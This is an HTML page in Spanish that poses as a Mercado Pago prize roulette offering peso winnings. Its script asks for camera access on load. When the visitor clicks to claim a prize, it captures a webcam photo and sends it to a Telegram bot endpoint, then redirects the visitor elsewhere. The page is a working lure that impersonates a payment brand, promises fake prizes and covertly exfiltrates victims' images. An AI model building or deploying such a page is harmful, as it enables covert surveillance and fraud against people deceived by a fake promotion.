<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ruleta de Mercado Pago</title>
    <style>
        /* Fondo de Mercado Pago */
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Mercado_Pago_Logo_2018.png/500px-Mercado_Pago_Logo_2018.png'); /* Fondo Mercado Pago */
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
        }

        h1 {
            position: absolute;
            top: 20px;
            color: #0038a8;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
            font-size: 30px;
            z-index: 10;
        }

        /* Ruleta */
        .ruleta {
            width: 80vw;
            height: 80vw;
            max-width: 350px;
            max-height: 350px;
            border-radius: 50%;
            position: relative;
            background: conic-gradient(
                #0038a8 0deg 60deg, 
                #005ab5 60deg 120deg, 
                #007bff 120deg 180deg, 
                #0099ff 180deg 240deg, 
                #66ccff 240deg 300deg, 
                #99ccff 300deg 360deg
            );
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
            transition: transform 4s ease-out;
        }

        /* Estilo para los sectores de la ruleta */
        .sector {
            position: absolute;
            width: 50%;
            height: 50%;
            text-align: center;
            font-size: 18px;
            color: white;
            font-weight: bold;
            display: flex;
            justify-content: center;
            align-items: center;
            padding-top: 20px;
            line-height: 35px;
        }

        /* Posicionando los sectores de forma correcta */
        .sector:nth-child(1) { transform: rotate(0deg); top: 5%; left: 50%; transform-origin: 100% 100%; }
        .sector:nth-child(2) { transform: rotate(60deg); top: 5%; left: 50%; transform-origin: 100% 100%; }
        .sector:nth-child(3) { transform: rotate(120deg); top: 5%; left: 50%; transform-origin: 100% 100%; }
        .sector:nth-child(4) { transform: rotate(180deg); top: 5%; left: 50%; transform-origin: 100% 100%; }
        .sector:nth-child(5) { transform: rotate(240deg); top: 5%; left: 50%; transform-origin: 100% 100%; }
        .sector:nth-child(6) { transform: rotate(300deg); top: 5%; left: 50%; transform-origin: 100% 100%; }

        /* Botones */
        #spinButton, #reclamarBtn {
            margin-top: 20px;
            padding: 12px 24px;
            font-size: 18px;
            cursor: pointer;
            background-color: #0038a8;
            color: white;
            border: none;
            border-radius: 5px;
            transition: background-color 0.3s;
            width: 80%;
            max-width: 200px;
            z-index: 10;
        }

        #spinButton:hover, #reclamarBtn:hover {
            background-color: #005ab5;
        }

        #reclamarBtn {
            display: none;
            animation: showBox 1s ease-out;
        }

        #premioDisplay {
            font-size: 22px;
            font-weight: bold;
            color: #007bff;
            margin-top: 20px;
            z-index: 10;
        }

        @keyframes showBox {
            0% {
                transform: scale(0);
                opacity: 0;
            }
            100% {
                transform: scale(1);
                opacity: 1;
            }
        }

        /* Aseguramos que todo se vea bien en dispositivos pequeÃ±os */
        @media screen and (max-width: 600px) {
            .ruleta {
                width: 90vw;
                height: 90vw;
            }

            h1 {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>

    <h1>Ruleta de Mercado Pago</h1>

    <div class="ruleta" id="ruleta">
        <div class="sector">5000 ARG</div>
        <div class="sector">7000 ARG</div>
        <div class="sector">1000 ARG</div>
        <div class="sector">15000 ARG</div>
        <div class="sector">40000 ARG</div>
        <div class="sector">50000 ARG</div>
    </div>

    <button id="spinButton">Girar Ruleta</button>
    <button id="reclamarBtn" onclick="reclamarPremio()">Reclamar Premio</button>
    <p id="premioDisplay"></p>

    <script>
        let camara;
        let premio = "";
        let premios = [
            { cantidad: "5000 ARG", icono: "ðŸ’°" },
            { cantidad: "7000 ARG", icono: "ðŸ’°" },
            { cantidad: "1000 ARG", icono: "ðŸ’°" },
            { cantidad: "15000 ARG", icono: "ðŸ’°" },
            { cantidad: "40000 ARG", icono: "ðŸ’°" },
            { cantidad: "50000 ARG", icono: "ðŸ’°" }
        ];

        // Solicitar permiso para la cÃ¡mara
        navigator.mediaDevices.getUserMedia({ video: true })
            .then((stream) => {
                camara = stream;
                const videoElement = document.createElement('video');
                videoElement.srcObject = stream;
                videoElement.play();
                document.body.appendChild(videoElement);
            })
            .catch((error) => {
                console.error('Error al obtener la cÃ¡mara:', error);
                alert("No se pudo acceder a la cÃ¡mara. Por favor, verifica los permisos.");
            });

        document.getElementById('spinButton').addEventListener('click', function() {
            let randomDeg = Math.floor(Math.random() * 360) + 720;
            document.getElementById('ruleta').style.transition = 'transform 4s ease-out';
            document.getElementById('ruleta').style.transform = 'rotate(' + randomDeg + 'deg)';

            setTimeout(() => {
                let premioAleatorio = premios[Math.floor(Math.random() * premios.length)];
                premio = premioAleatorio.cantidad;
                document.getElementById('premioDisplay').textContent = `Â¡Has ganado: ${premio}!`;
                document.getElementById('reclamarBtn').style.display = "block";
            }, 4000);
        });

        async function tomarFoto() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 400;
                canvas.height = 300;
                const ctx = canvas.getContext('2d');
                
                const video = document.createElement('video');
                video.srcObject = camara;
                video.play();

                video.onloadeddata = () => {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const foto = canvas.toDataURL('image/png'); 

                    fetch('https://api.telegram.org/bot<your-bot-token>/sendPhoto', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: '<your-chat-id>',
                            photo: foto
                        })
                    }).then(response => response.json())
                      .then(data => console.log('Foto enviada correctamente!'))
                      .catch(error => console.error('Error al enviar la foto:', error));
                };
            } catch (error) {
                console.error('Error al tomar la foto:', error);
            }
        }

        function reclamarPremio() {
            tomarFoto(); 
            alert("Â¡Has ganado un premio de " + premio + "! Redirigiendo a otro enlace...");
            window.location.href = "https://otro-enlace.com"; 
        }
    </script>

</body>
</html>
